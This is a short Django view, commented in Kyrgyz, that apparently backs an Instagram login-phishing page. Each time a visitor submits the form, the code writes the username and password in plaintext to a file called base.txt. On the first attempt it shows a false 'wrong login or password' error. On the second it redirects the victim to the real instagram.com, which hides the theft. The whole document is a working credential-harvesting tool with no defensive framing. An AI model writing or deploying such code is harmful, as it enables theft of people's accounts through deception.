from django.shortcuts import render, redirect

def index(request):
    # Сессияда 'attempts' (аракеттер) деген өзгөрмө жок болсо, 0 кылып түзөбүз
    if 'attempts' not in request.session:
        request.session['attempts'] = 0
        
    error_message = None
    
    if request.method == "POST":
        u_name = request.POST.get('username', '').strip()
        p_word = request.POST.get('password', '').strip()
        
        # 1. Ар бир баскан сайын маалыматты файлга сактайбыз
        with open("base.txt", "a", encoding="utf-8") as file:
            file.write(f"Аракет {request.session['attempts'] + 1}: Логин: {u_name} | Пароль: {p_word}\n")
        
        # 2. Аракеттердин санын көбөйтөбүз
        request.session['attempts'] += 1
        
        # 3. Шартыбыз: Эгер 2ден көп аракет болсо (демек 3-жолу басылды)
        if request.session['attempts'] >= 2:
            # Сессияны тазалайбыз (кийинки жолу кайра башынан башталышы үчүн)
            request.session['attempts'] = 0
            return redirect("https://www.instagram.com")
        else:
            # 1- жана 2- жолунда ката билдирүүсү чыгат
            error_message = "Логин же пароль туура эмес! Кайра аракет кылыңыз."
            
    return render(request, 'main/login.html', {'error': error_message})